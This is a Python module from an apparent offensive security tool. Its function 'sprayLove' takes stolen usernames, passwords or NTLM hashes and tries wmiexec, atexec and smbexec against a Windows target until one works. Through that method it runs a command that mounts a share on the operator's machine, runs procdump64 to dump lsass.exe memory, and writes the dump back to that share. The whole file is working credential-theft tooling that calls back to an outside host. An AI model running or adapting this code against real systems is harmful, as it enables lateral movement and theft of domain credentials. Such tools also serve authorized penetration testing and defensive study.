# coding: utf-8

# Author:	Lyderic LEFEBVRE
# Twitter:	@lydericlefebvre
# Mail:		lylefebvre.infosec@gmail.com
# LinkedIn:	https://www.linkedin.com/in/lydericlefebvre


# Imports
import logging
import wmiexec, atexec, smbexec
from core.Utils import *
from core.SmbConnection import *
from core.Colors import *


def sprayLove(user, target, methods, share):
	if not methods : methods = ['wmiexec', 'atexec', 'smbexec']
	smb_share_name = gen_random_string(5)
	
	payload = "net use \\\\%s\\procdump\\ && \\\\%s\\procdump\\procdump64.exe -accepteula -ma lsass.exe \\\\%s\\dumps\\%s.dmp" % (retrieveMyIP(), retrieveMyIP(), retrieveMyIP(), target)
	exec_method = None

	for method in methods:
		if method == 'wmiexec':
			smbConnection = SmbConnection()
			if smbConnection.create_conn_obj(target):
				try:	
					exec_method = wmiexec.WMIEXEC(target, smb_share_name, user.username, user.password, user.domain, smbConnection.smbConnection, user.lmhash + ':' + user.nthash, share)
					logging.info("%s   %s: %swmiexec%s seems to be an %sOK%s method. let's go... " % (infoYellow, target, green, white, green, white))
					break
				except Exception as e:
					logging.info("%s   %s: %swmiexec%s seems to be an %sKO%s method." % (infoYellow, target, red, white, red, white))
					logging.info("%s   %s: %s" % (infoYellow, target, e))
					continue
			else:
				logging.warning("%s   %s: %sFailed to create a SMB Connection. Aborting." % (warningRed, target, red, white))
					
				'''
				TODO
				elif method == 'mmcexec':
					try:
						exec_method = mmcexec.MMCEXEC(target, smb_share_name, user.username, user.password, user.domain, smbConnection, user.lmhash + ':' + user.nthash)
						logging.info("%s   %s: %smmcexec%s seems to be an %sOK%s method. let's go... " % (infoYellow, target, green, white, green, white))
						break
					except Exception as e:
						logging.info("%s   %s: %smmcexec%s seems to be an %sKO%s method." % (infoYellow, target, red, white, red, white))
						logging.info("%s   %s: %s" % (infoYellow, target, e))
						continue
				'''

		elif method == 'atexec':
			try:
				exec_method = atexec.TSCH_EXEC(target, smb_share_name, user.username, user.password, user.domain, user.lmhash + ':' + user.nthash)
				logging.info("%s   %s: %satexec%s seems to be an %sOK%s method. let's go... " % (infoYellow, target, green, white, green, white))
				break
			except Exception as e:
				logging.info("%s   %s: %satexec%s seems to be an %sKO%s method." % (infoYellow, target, red, white, red, white))
				logging.info("%s   %s: %s" % (infoYellow, target, e))
				continue

		else:
			try:
				exec_method = smbexec.SMBEXEC(target, smb_share_name, 445, user.username, user.password, user.domain, user.lmhash + ':' + user.nthash, share)
				logging.info("%s   %s: %ssmbexec%s seems to be an %sOK%s method. let's go... " % (infoYellow, target, green, white, green, white))
				break
			except Exception as e:
				logging.info("%s   %s: %ssmbexec%s seems to be an %sKO%s method." % (infoYellow, target, red, white, red, white))
				logging.info("%s   %s: %s" % (infoYellow, target, e))
				continue

	if exec_method : output = u'{}'.format(exec_method.execute(payload, output=True).strip())